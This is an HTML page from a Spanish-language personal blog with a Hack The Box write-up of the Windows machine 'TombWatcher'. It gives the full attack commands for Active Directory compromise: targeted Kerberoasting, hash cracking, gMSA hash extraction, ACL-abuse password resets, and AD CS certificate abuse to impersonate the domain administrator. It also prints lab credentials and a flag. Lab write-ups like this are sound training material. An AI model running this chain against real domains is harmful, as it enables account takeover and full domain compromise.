@@ -1,0 +1,1229 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../delegate/">
+      
+      
+        <link rel="next" href="../escapetwo/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/lucifer.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>TombWatcher - Bitácora de javik</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../estilos/gruvbox.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#maquina-tombwatcher" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../../.." title="Bitácora de javik" class="md-header__button md-logo" aria-label="Bitácora de javik" data-md-component="logo">
+      
+  <img src="../../../assets/lucifer.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Bitácora de javik
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              TombWatcher
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Bitácora de javik" class="md-nav__button md-logo" aria-label="Bitácora de javik" data-md-component="logo">
+      
+  <img src="../../../assets/lucifer.png" alt="logo">
+
+    </a>
+    Bitácora de javik
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎯 Bitácora de javik
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💀 Máquinas HTB
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    💀 Máquinas HTB
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../administrator/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Administrator
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../babytwo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BabyTwo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../delegate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Delegate
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TombWatcher
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../escapetwo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    EscapeTwo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../breach/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Breach
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../media/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Media
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../authority/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authority
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../herramientas/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🛠️ Herramientas
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🛠️ Herramientas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/nxc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NetExec (NXC)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/sliver-c2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Sliver C2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/seimpersonate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SeImpersonatePrivilege
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/mssql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enumeración MSSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/chisel-pivoting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chisel & Pivoting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../certificaciones/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏆 Certificaciones
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../mis-notas/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mis Notas
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Mis Notas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mis-notas/configuracion-ad-basico/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Configuración de AD Básico
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mis-notas/ataques-adcs-esc1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Abuso de AD CS (ESC1)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="maquina-tombwatcher">Máquina: TombWatcher<a class="headerlink" href="#maquina-tombwatcher" title="Permanent link">&para;</a></h1>
+<ul>
+<li><strong>Sistema Operativo:</strong> Windows</li>
+<li><strong>Dificultad:</strong> Media</li>
+<li><strong>Técnicas clave:</strong> Active Directory, LDAP Enumeration, SMB, PrivEsc</li>
+</ul>
+<hr />
+<p><img alt="Pasted image 20260705115544.png" src="../assets/Pasted%20image%2020260705115544.png" /></p>
+<p>Como es común en las pruebas de penetración de Windows de la vida real, iniciará el cuadro TombWatcher con credenciales para la siguiente cuenta: henry / H3nry_987TGV!</p>
+<p><img alt="Pasted image 20260705121316.png" src="../assets/Pasted%20image%2020260705121316.png" /></p>
+<p>comando:</p>
+<div class="highlight"><pre><span></span><code>sudo nmap -sVC --min-rate 5000 -n -Pn -p- --open -sS 10.129.232.167 -oN escaneo
+</code></pre></div>
+<p><img alt="Pasted image 20260705122457.png" src="../assets/Pasted%20image%2020260705122457.png" /></p>
+<p>se guarda etc/hosts</p>
+<p>miramos res cursos del usuario y tiene todos los normales <img alt="Pasted image 20260705123203.png" src="../assets/Pasted%20image%2020260705123203.png" /></p>
+<p>comando: </p>
+<div class="highlight"><pre><span></span><code>nxc smb 10.129.232.167 -u henry -p H3nry_987TGV! --shares
+</code></pre></div>
+<p>nos descargamos la condi del ad para blood podemos usar dos notas siempre mirar diferentes coleptores</p>
+<p>comando:</p>
+<div class="highlight"><pre><span></span><code>bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' get bloodhound
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>bloodhound-ce-python -u alfred -p 'basketball' -d tombwatcher.htb -dc dc01.tombwatcher.htb -ns 10.129.232.167 -c All --zip
+</code></pre></div>
+<p><img alt="Pasted image 20260705123812.png" src="../assets/Pasted%20image%2020260705123812.png" /></p>
+<p><img alt="Pasted image 20260705233529.png" src="../assets/Pasted%20image%2020260705233529.png" /></p>
+<p>le blood nos dise que henry tiene writesspn sobre el usuario alfred</p>
+<p><img alt="Pasted image 20260705125100.png" src="../assets/Pasted%20image%2020260705125100.png" /></p>
+<p>pero que es esto:</p>
+<p>El abuso de <code>WriteSPN</code> se llama <strong>Targeted Kerberoasting</strong> (Kerberoasting dirigido). Te explico bien cómo funciona y por qué es tan efectivo:</p>
+<p><strong>¿Qué es normalmente el Kerberoasting?</strong><br />
+En un dominio AD, cualquier usuario autenticado puede pedir un ticket de servicio (TGS) para cualquier cuenta que tenga un SPN (Service Principal Name) configurado. Ese ticket viene cifrado con el hash de la contraseña de la cuenta de servicio. Si lográs ese ticket, te lo llevás a crackear offline con <code>hashcat</code> tratando de adivinar la contraseña.</p>
+<p><strong>El problema del Kerberoasting clásico:</strong><br />
+Solo funciona sobre cuentas que YA tienen un SPN configurado (típicamente cuentas de servicio con contraseñas viejas y débiles). Si <code>alfred</code> no tiene ningún SPN, normalmente no podrías kerberoastear su cuenta.</p>
+<p><strong>Acá está la clave del abuso:</strong><br />
+Vos (<code>henry</code>) tenés el permiso <code>WriteSPN</code> sobre <code>alfred</code>, es decir, <strong>podés escribirle un SPN falso</strong> aunque <code>alfred</code> no sea una cuenta de servicio. Una vez que le agregás ese SPN:</p>
+<ol>
+<li>El dominio ahora "cree" que <code>alfred</code> es una cuenta de servicio</li>
+<li>Podés pedir un ticket TGS para ese SPN falso</li>
+<li>Ese ticket viene cifrado con el hash NTLM de la contraseña de <code>alfred</code></li>
+<li>Te lo llevás y lo crackeás offline</li>
+</ol>
+<p>En resumen: <strong>convertís a cualquier usuario en "kerberoasteable" con solo tener ese permiso</strong>, sin importar si tenía o no un SPN antes. Es un método muy directo para pasar de tu usuario <code>henry</code> a comprometer <code>alfred</code>.</p>
+<p><strong>Los pasos técnicos</strong> ya te los pasé arriba (agregar el SPN con bloodyAD, después pedir el ticket con <code>GetUserSPNs.py -request</code>, después crackear con hashcat modo <code>13100</code>).</p>
+<p>ya teniendo esto en cuenta se agrega un spn falso<img alt="Pasted image 20260705134201.png" src="../assets/Pasted%20image%2020260705134201.png" /></p>
+<p>comando:</p>
+<div class="highlight"><pre><span></span><code>bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' set object alfred servicePrincipalName -v 'hackx/legit'
+</code></pre></div>
+<p>luego se Pide  el ticket TGS de ese SPN falso</p>
+<p>comando: </p>
+<div class="highlight"><pre><span></span><code>GetUserSPNs.py tombwatcher.htb/henry:'H3nry_987TGV!' -dc-ip 10.129.232.167 -request
+</code></pre></div>
+<p><img alt="Pasted image 20260705174929.png" src="../assets/Pasted%20image%2020260705174929.png" /></p>
+<p>lo guardamos en un archivo<img alt="Pasted image 20260705175125.png" src="../assets/Pasted%20image%2020260705175125.png" /></p>
+<p>comando:</p>
+<div class="highlight"><pre><span></span><code>GetUserSPNs.py tombwatcher.htb/henry:'H3nry_987TGV!' -dc-ip 10.129.232.167 -request -outputfile alfred.kerberoast
+</code></pre></div>
+<p>luego lo rompemos con hascat </p>
+<p>comando:  </p>
+<div class="highlight"><pre><span></span><code>hashcat -m 13100 alfred.kerberoast /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
+</code></pre></div>
+<p><img alt="Pasted image 20260705180354.png" src="../assets/Pasted%20image%2020260705180354.png" /></p>
+<p>la pass: basketball</p>
+<p><img alt="Pasted image 20260705180805.png" src="../assets/Pasted%20image%2020260705180805.png" /></p>
+<p>tambien enumerando en contre la cuenta para la cual los miembros del grupo INFRAESTRUCTURA pueden leer la contraseña de gMSA<img alt="Pasted image 20260705220124.png" src="../assets/Pasted%20image%2020260705220124.png" /></p>
+<p>comando:
+<div class="highlight"><pre><span></span><code>bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'alfred' -p 'basketball' get search --filter '(objectClass=msDS-GroupManagedServiceAccount)' --attr sAMAccountName,msDS-GroupMSAMembership --resolve-sd
+</code></pre></div></p>
+<p><img alt="Pasted image 20260705220457.png" src="../assets/Pasted%20image%2020260705220457.png" /></p>
+<p>pero aun no tenemos abseso a ese grupo pero enumerado miramos que al fred se puede agregar al grupo ingre estructure</p>
+<p><img alt="Pasted image 20260705221653.png" src="../assets/Pasted%20image%2020260705221653.png" />
+comando:</p>
+<div class="highlight"><pre><span></span><code>bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'alfred' -p 'basketball' get object 'Infrastructure' --attr member
+</code></pre></div>
+<p>asi que nos agregamos al grupo infra estructure</p>
+<p><img alt="Pasted image 20260705222134.png" src="../assets/Pasted%20image%2020260705222134.png" /></p>
+<p>comando: </p>
+<div class="highlight"><pre><span></span><code>bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'alfred' -p 'basketball' add groupMember Infrastructure alfred
+</code></pre></div>
+<p>para confirmar mejor asemos esto u sacamos los hash ntlm dela cuenta de maquina </p>
+<p><img alt="Pasted image 20260705224823.png" src="../assets/Pasted%20image%2020260705224823.png" /></p>
+<p>comando:</p>
+<div class="highlight"><pre><span></span><code>bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'alfred' -p 'basketball' -v DEBUG add groupMember Infrastructure alfred
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>nxc ldap 10.129.232.167 -u alfred -p basketball --gmsa
+</code></pre></div>
+<p>ya con el hash dela cuenta de maquina esta tiene la cambiamos la pass a sam </p>
+<p><img alt="Pasted image 20260705225934.png" src="../assets/Pasted%20image%2020260705225934.png" /></p>
+<p><img alt="Pasted image 20260705234118.png" src="../assets/Pasted%20image%2020260705234118.png" />
+comandos:</p>
+<div class="highlight"><pre><span></span><code>bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'ansible_dev$' -p ':b91f529d36292ba764273e5dd7b90fa1' set password sam 'pepe123'
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>nxc smb 10.129.232.167 -u 'sam' -p 'pepe123'
+</code></pre></div>
+<p><img alt="Pasted image 20260705234423.png" src="../assets/Pasted%20image%2020260705234423.png" /></p>
+<p>sam tiene writeOwner sobre john que es esto :</p>
+<p>En Active Directory, <strong>WriteOwner</strong> es un permiso de control de acceso (ACE) que permite a un usuario o grupo <strong>cambiar la propiedad (dueño) de un objeto</strong>. </p>
+<p><strong>Puntos clave:</strong></p>
+<ul>
+<li>
+<p><strong>Capacidad de toma de control:</strong> Al ser el propietario de un objeto, se tiene el derecho de modificar su lista de control de acceso (DACL), lo que permite otorgarse a sí mismo control total sobre ese objeto, incluso sin tener permisos explícitos previos. </p>
+</li>
+<li>
+<p><strong>Riesgo de seguridad:</strong> Este permiso es crítico para la escalación de privilegios. Si un atacante obtiene <strong>WriteOwner</strong> sobre un grupo privilegiado (como <em>Domain Admins</em>), puede cambiar la propiedad del grupo a su cuenta y luego modificar los permisos para añadirse al mismo. </p>
+</li>
+<li>
+<p><strong>Diferencia con otras propiedades:</strong> No debe confundirse con la propiedad <code>owner</code> estándar (visible en el descriptor de seguridad); <strong>WriteOwner</strong> es el permiso específico que autoriza la modificación de dicha propiedad. </p>
+</li>
+</ul>
+<p>sabiendo est prosedemos con el abuso primero cambiamos el dueño de ese objeto de <code>Domain Admins</code> a <code>sam</code>.</p>
+<p>comando:</p>
+<div class="highlight"><pre><span></span><code>owneredit.py -action write -target john -new-owner sam 'tombwatcher.htb/sam:pepe123' -dc-ip 10.129.232.167
+</code></pre></div>
+<p><img alt="Pasted image 20260706000859.png" src="../assets/Pasted%20image%2020260706000859.png" /></p>
+<p>Siguiente paso — otorgarnos GenericAll y cambiar la pass de john</p>
+<p>comandos:</p>
+<div class="highlight"><pre><span></span><code>bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'sam' -p 'pepe123' add genericAll john sam
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'sam' -p 'pepe123' set password john 'pepe1234'
+</code></pre></div>
+<p><img alt="Pasted image 20260706001220.png" src="../assets/Pasted%20image%2020260706001220.png" />
+<img alt="Pasted image 20260706001420.png" src="../assets/Pasted%20image%2020260706001420.png" /></p>
+<p>ya sabiendo esto nos conectamos por winrm con este usuario </p>
+<p>comando: </p>
+<div class="highlight"><pre><span></span><code>evil-winrm -i 10.129.232.167 -u 'john' -p 'pepe1234'
+</code></pre></div>
+<p><img alt="Pasted image 20260706002458.png" src="../assets/Pasted%20image%2020260706002458.png" /></p>
+<p>sacamos user.txt</p>
+<p><code>1afd34fc6f25c5c746d813acd0a7c273</code></p>
+<p>luego de enumerar  encontramos esto 
+<img alt="Pasted image 20260706005129.png" src="../assets/Pasted%20image%2020260706005129.png" /></p>
+<p>se SID (...-1111) es justo el que Certipy no pudo resolver a un nombre (fijate arriba en el log: [!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'). Esto confirma la teoría del nombre "TombWatcher" — es una cuenta eliminada de AD que sigue teniendo permisos de enrollment residuales sobre ese template, y probablemente tengas que recuperarla del AD Recycle Bin para poder usarla.</p>
+<p>asi que prosedemos a mirar cuentas eliminadas y en contramos lo siguiente<img alt="Pasted image 20260706005509.png" src="../assets/Pasted%20image%2020260706005509.png" /></p>
+<p>luego busamos y ese temaplate tiene un cve que ase dicho cve CVE-2024-49019) </p>
+<p>El template <code>WebServer</code> tiene <strong>Schema Version 1</strong> y <code>Enrollee Supplies Subject: True</code>, pero solo declara <code>Extended Key Usage: Server Authentication</code> (no Client Authentication). En certificados de Schema V1, Windows no aplica una restricción estricta sobre las Application Policies — un solicitante puede <strong>inyectar manualmente una Application Policy de "Client Authentication"</strong> al pedir el certificado, aunque el template no la tenga configurada. Eso permite usar un certificado pensado para servidores como si fuera de autenticación de cliente, y autenticarte como cualquier usuario (en este caso, <code>administrator@tombwatcher.htb</code>).</p>
+<p>sabiendo esto restauramos la cuenta </p>
+<p>comandos:</p>
+<div class="highlight"><pre><span></span><code>Get-ADObject -Filter {objectGUID -eq '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'} -IncludeDeletedObjects | Restore-ADObject
+</code></pre></div>
+<p>cuenta restaurada luego se habilita la cuenta </p>
+<div class="highlight"><pre><span></span><code>Enable-ADAccount -Identity cert_admin
+</code></pre></div>
+<p>cuenta habilitada luego se cambia la pass </p>
+<div class="highlight"><pre><span></span><code>Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "NuevaPass789!" -AsPlainText -Force)
+</code></pre></div>
+<p>se confirma que quedo bien todo</p>
+<div class="highlight"><pre><span></span><code>Get-ADUser cert_admin
+</code></pre></div>
+<p><img alt="Pasted image 20260706010355.png" src="../assets/Pasted%20image%2020260706010355.png" /></p>
+<p>ya luego pedimos un certificado valido </p>
+<div class="highlight"><pre><span></span><code>certipy req -u cert_admin -p 'NuevaPass789!' -dc-ip 10.129.232.167 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'
+</code></pre></div>
+<p><img alt="Pasted image 20260706010643.png" src="../assets/Pasted%20image%2020260706010643.png" /></p>
+<p>nota impotante esto lo yse en un contenedor de doker por que tenia problemas de dependencia </p>
+<div class="highlight"><pre><span></span><code>certipy-ad auth -pfx /administrator.pfx -dc-ip 10.129.232.167 -ldap-shell
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+</code></pre></div>
+<p>luego sele cambia la pass al usuario </p>
+<div class="highlight"><pre><span></span><code>change_password administrator NewPass0rd!
+</code></pre></div>
+<p><img alt="Pasted image 20260706022115.png" src="../assets/Pasted%20image%2020260706022115.png" /></p>
+<p>ya nos conectamos por evil con  este usuario y su pass </p>
+<div class="highlight"><pre><span></span><code>evil-winrm -i 10.129.232.167 -u administrator -p 'NewPass0rd!'
+</code></pre></div>
+<p>y sacamos root.txt<img alt="Pasted image 20260706022225.png" src="../assets/Pasted%20image%2020260706022225.png" /></p>
+<p><img alt="Pasted image 20260712190728.png" src="../assets/Pasted%20image%2020260712190728.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
